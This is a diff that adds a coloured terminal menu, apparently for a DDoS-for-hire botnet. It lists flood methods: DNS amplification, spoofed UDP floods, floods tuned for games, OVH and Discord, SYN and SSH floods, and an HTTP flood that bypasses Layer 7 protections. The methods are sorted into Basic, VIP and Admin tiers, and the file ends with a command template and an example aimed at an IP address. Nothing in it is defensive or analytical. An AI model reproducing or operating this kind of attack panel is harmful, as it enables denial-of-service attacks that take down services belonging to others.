@@ -1,0 +1,19 @@
+<<$clear>>[8;24;100t[38;5;11mHold Network[97m:
+[38;5;1m* [38;5;255mhold         [97m-  [38;5;46mUDP[97m  -   [38;5;255mDNS Amplification Flood[38;5;240m.                                          
+[38;5;11mBasic Network[97m:
+[38;5;1m* [38;5;255mdns          [97m-  [38;5;46mUDP[97m  -   [38;5;255mDNS Amplification attack, Very Large Byte Size [97m[[38;5;46mHigh gbit/s[97m]       
+[38;5;1m* [38;5;255mgame         [97m-  [38;5;46mUDP[97m  -   [38;5;255mOptimized For Ranked & Basic - Games [97m[[38;5;46mHigh pp/s[97m][38;5;240m.                  
+[38;5;1m* [38;5;255movh          [97m-  [38;5;37mTCP[97m  -   [38;5;255mOptimized To Bypass OVH's Firewalls Attack Vectors "psh, ack"[38;5;240m.     
+[38;5;1m* [38;5;255mhttp         [97m-  [38;5;9mHTTP[97m -   [38;5;255mHigh Request Per Second Flood - "HTTP-DDOS"[38;5;240m.                       
+[38;5;11mVip Network[97m:
+[38;5;1m* [38;5;255mgudp         [97m-  [38;5;46mUDP[97m  -   [38;5;255mHigh Volume, Generic UDP Flood [97m[[38;5;46mHigh gbit/s[97m][38;5;240m.             
+[38;5;1m* [38;5;255mpps          [97m-  [38;5;46mUDP[97m  -   [38;5;255mHigh Volume, Spoofed UDP [97m[97m[[38;5;46mHigh pp/s[97m][38;5;240m.                       
+[38;5;1m* [38;5;255mvse          [97m-  [38;5;46mUDP[97m  -   [38;5;255mValve Game Source Flood with Custom Game Payloads For [97m[[38;5;46mHigh pp/s[97m][38;5;240m.
+[38;5;1m* [38;5;255mdiscord      [97m-  [38;5;46mUDP[97m  -   [38;5;255mSpoofed / Raw Traffic Made For Bypassing Discord Calls[38;5;240m.           
+[38;5;1m* [38;5;255mtcp          [97m-  [38;5;37mTCP[97m  -   [38;5;255mOptimized For Bypassing TCP Targets[97m, [97mAttack Vectors [97m"[97mSYN"[97[38;5;240m.
+[38;5;1m* [38;5;255mssh          [97m-  [38;5;37mTCP[97m  -   [38;5;255mssh flood, Flags: "ACK", "SYN", "SSH", "SOCKET"[38;5;240m.
+[38;5;1m* [38;5;255mbypass       [97m-  [38;5;9mHTTP[97m -   [38;5;255mbypass made for all L7 protections, UAM, BROWSER, TLS, HTTP[38;5;240m.
+[38;5;11mAdmin[97m: 
+[38;5;1m* [38;5;255mstopall      [97m-  [38;5;9mVIP+[97m -   [38;5;255mStops All Attacks Ongoing, via spoofs. only for admin[38;5;240m.    
+[38;5;11mPreset[97m: [38;5;240m[97mhold [38;5;240m<[97mtarget[38;5;240m> <[97mport[38;5;240m> [38;5;240m<[97mtime[38;5;240m>
+[38;5;11mExample[97m: [38;5;240m[97mhold 70.70.70.7 53 120
